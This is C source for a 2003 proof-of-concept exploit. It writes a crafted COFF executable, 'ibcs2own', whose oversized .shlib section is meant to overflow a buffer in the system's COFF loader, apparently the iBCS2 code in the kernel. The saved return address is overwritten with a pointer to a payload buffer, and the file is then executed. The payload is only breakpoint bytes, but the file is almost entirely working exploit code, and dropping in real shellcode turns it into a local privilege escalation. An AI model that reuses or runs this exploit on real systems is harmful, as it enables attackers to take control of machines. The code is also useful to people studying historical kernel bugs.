/**     (c) 2003 Sinan "noir" Eren                              **/
/**     noir@olympos.org | noir@uberhax0r.net                    **/

/** creates a fake COFF executable with large .shlib section size **/
 
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/signal.h>

unsigned char shellcode[] =
"\xcc\xcc"; /* only int3 (debug interrupt) at the moment */

#define ZERO(p) memset(&p, 0x00, sizeof(p))

/*
 * COFF file header
 */

struct coff_filehdr {
    u_short     f_magic;        /* magic number */
    u_short     f_nscns;        /* # of sections */
    long        f_timdat;       /* timestamp */
    long        f_symptr;       /* file offset of symbol table */
    long        f_nsyms;        /* # of symbol table entries */
    u_short     f_opthdr;       /* size of optional header */
    u_short     f_flags;        /* flags */
};

/* f_magic flags */
#define COFF_MAGIC_I386 0x14c

/* f_flags */
#define COFF_F_RELFLG   0x1
#define COFF_F_EXEC     0x2
#define COFF_F_LNNO     0x4
#define COFF_F_LSYMS    0x8
#define COFF_F_SWABD    0x40
#define COFF_F_AR16WR   0x80
#define COFF_F_AR32WR   0x100

/*
 * COFF system header
 */

struct coff_aouthdr {
    short       a_magic;
    short       a_vstamp;
    long        a_tsize;
    long        a_dsize;
    long        a_bsize;
    long        a_entry;
    long        a_tstart;
    long        a_dstart;
};

/* magic */
#define COFF_ZMAGIC     0413

/*
 * COFF section header
 */

struct coff_scnhdr {
    char        s_name[8];
    long        s_paddr;
    long        s_vaddr;
    long        s_size;
    long        s_scnptr;
    long        s_relptr;
    long        s_lnnoptr;
    u_short     s_nreloc;
    u_short     s_nlnno;
    long        s_flags;
};

/* s_flags */
#define COFF_STYP_TEXT          0x20
#define COFF_STYP_DATA          0x40
#define COFF_STYP_SHLIB         0x800

int
main(int argc, char **argv)
{
  u_int i, fd, debug = 0;
  u_char *ptr, *shptr;
  u_long *lptr, offset;
  char *args[] = { "./ibcs2own", NULL};
  char *envs[] = { "RIP=theo", NULL};
  //COFF structures
  struct coff_filehdr fhdr;
  struct coff_aouthdr ahdr;
  struct coff_scnhdr  scn0, scn1, scn2;

   if(argv[1]) {
      if(!strncmp(argv[1], "-v", 2))
              debug = 1;
      else {
              printf("-v: verbose flag only\n");
              exit(0);
            }
    }

    ZERO(fhdr);
    fhdr.f_magic = COFF_MAGIC_I386;
    fhdr.f_nscns = 3; //TEXT, DATA, SHLIB
    fhdr.f_timdat = 0xdeadbeef;
    fhdr.f_symptr = 0x4000;
    fhdr.f_nsyms = 1;
    fhdr.f_opthdr = sizeof(ahdr); //AOUT header size
    fhdr.f_flags = COFF_F_EXEC;

    ZERO(ahdr);
    ahdr.a_magic = COFF_ZMAGIC;
    ahdr.a_tsize = 0;
    ahdr.a_dsize = 0;
    ahdr.a_bsize = 0;
    ahdr.a_entry = 0x10000;
    ahdr.a_tstart = 0;
    ahdr.a_dstart = 0;

    ZERO(scn0);
    memcpy(&scn0.s_name, ".text", 5);
    scn0.s_paddr = 0x10000;
    scn0.s_vaddr = 0x10000;
    scn0.s_size = 4096;
    //file offset of .text segment
    scn0.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3);
    scn0.s_relptr = 0;
    scn0.s_lnnoptr = 0;
    scn0.s_nreloc = 0;
    scn0.s_nlnno = 0;
    scn0.s_flags = COFF_STYP_TEXT;

    ZERO(scn1);
    memcpy(&scn1.s_name, ".data", 5);
    scn1.s_paddr = 0x10000 - 4096;
    scn1.s_vaddr = 0x10000 - 4096;
    scn1.s_size = 4096;
    //file offset of .data segment
    scn1.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 4096;
    scn1.s_relptr = 0;
    scn1.s_lnnoptr = 0;
    scn1.s_nreloc = 0;
    scn1.s_nlnno = 0;
    scn1.s_flags = COFF_STYP_DATA;

    ZERO(scn2);
    memcpy(&scn2.s_name, ".shlib", 6);
    scn2.s_paddr = 0;
    scn2.s_vaddr = 0;

    //overflow vector!!!
    scn2.s_size = 0xb0; /* offset from start of buffer to saved eip */

    //file offset of .shlib segment
    scn2.s_scnptr = sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + (2*4096);
    scn2.s_relptr = 0;
    scn2.s_lnnoptr = 0;
    scn2.s_nreloc = 0;
    scn2.s_nlnno = 0;
    scn2.s_flags = COFF_STYP_SHLIB;

    ptr = (char *) malloc(sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + \
                 3*4096);
    memset(ptr, 0xcc, sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0)*3) + 3*4096);


    memcpy(ptr, (char *) &fhdr, sizeof(fhdr));
    offset = sizeof(fhdr);
     
    memcpy((char *) (ptr+offset), (char *) &ahdr, sizeof(ahdr));
    offset += sizeof(ahdr);

    memcpy((char *) (ptr+offset), (char *) &scn0, sizeof(scn0));
    offset += sizeof(scn0);

    memcpy((char *) (ptr+offset), (char *) &scn1, sizeof(scn1));
    offset += sizeof(scn1);

    memcpy((char *) (ptr+offset), (char *) &scn2, sizeof(scn2));

    lptr = (u_long *) ((char *)ptr + sizeof(fhdr) + sizeof(ahdr) + \
           (sizeof(scn0)*3) + (2*4096) + 0xb0 - 8);

    shptr = (char *) malloc(4096);
    if(debug)
      printf("payload adr: 0x%.8x\n", shptr);
    memset(shptr, 0xcc, 4096);

    *lptr++ = 0xdeadbeef;
    *lptr = (u_long) shptr;

    memcpy(shptr, shellcode, sizeof(shellcode)-1);

    unlink("./ibcs2own"); /* remove the left overs from prior executions */

    if((fd = open("./ibcs2own", O_CREAT^O_RDWR, 0755)) < 0) {
                perror("open");
                exit(-1);
        }

    write(fd, ptr, sizeof(fhdr) + sizeof(ahdr) + (sizeof(scn0) * 3) + (4096*3));
    close(fd);
    free(ptr);

    execve(args[0], args, envs);
    perror("execve");

}
